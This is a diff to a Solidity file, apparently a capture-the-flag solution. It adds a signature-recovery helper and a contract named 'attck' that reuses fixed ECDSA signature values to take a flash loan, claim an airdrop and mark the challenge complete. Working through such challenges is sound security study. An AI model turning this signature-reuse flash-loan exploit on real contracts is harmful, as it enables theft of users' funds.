@@ -132,6 +132,7 @@ library ECDSAUpgradeable {
         return recovered;
     }
 
+
     function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverError) {
         if (signature.length == 65) {
             bytes32 r;
@@ -258,7 +259,16 @@ contract FlashLoanPriveder {
     }
 
 }
-
+contract figure{
+    function fig(bytes32 message,bytes memory signature)public view returns(address){
+        // bytes32 message = 0xf4bb90b480a5299a921f92411380d2f4af685436fc1b44ac8d483e6aa37e7e35;
+        // bytes memory signature = '0xb332ebe208a84e80daee1e1f3802f51d4f49d235430cdac8fd4a0b4f46387bee1e20f9041f014dd64f75683d6a230aed1bf9a6b0e2f1c6b3b4504118394dc4411b';
+        return ECDSAUpgradeable.recover(message,signature);
+    }
+    function get(bytes32 hash)public view returns(bytes32){
+        return ECDSAUpgradeable.toEthSignedMessageHash(hash);
+    }
+}
 
 contract Cert {
     mapping(address => uint256) private _balances;
@@ -430,6 +440,45 @@ contract FlashLoanMain {
         }
         return isComplete;
     }
+}
+contract attck{
+    bytes32 public msgHash = 0x1a6092262d7dc33c2f4b9913ad9318a8c41a138bb42dfacd4c7b6b46b8656522;
+    bytes32 public r = 0xb158f1759111cd99128505f450f608c97178e2b6b9b6f7c3b0d2949e3a21cd02;
+    bytes32 public s = 0x3ade8887fce9b513d41eb36180d6f7d9e072c756991034de2c9a5da541fb8184;
+    uint8 public v = 0x1b;
+    FlashLoanMain public flashloanAddr;
+    address public flashLoanPriveder;
+    Cert cert;
+    function init(address _addr,address _privedor,address _cert)public {
+        flashloanAddr = FlashLoanMain( _addr);
+        flashLoanPriveder = _privedor;
+        cert = Cert(_cert);
+    }
+    function figure()public view returns(address){
+        return ECDSAUpgradeable.recover(msgHash,v,r,s);
+    }
+    function att(
+        IFlashBorrower borrower,
+        address token,
+        uint256 amount,
+        bytes memory signature
+        )public{
+        IFlashLoanPriveder(flashLoanPriveder).flashLoan(borrower,token,amount,signature,bytes(""));
+    }
+    function air()public{
+        flashloanAddr.airdrop();
+    }
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        bytes calldata data
+    ) external returns (bool){
+        flashloanAddr.Complete();
+        cert.approve(flashLoanPriveder,amount);
+        return true;
+    }
+    
 }
 
 
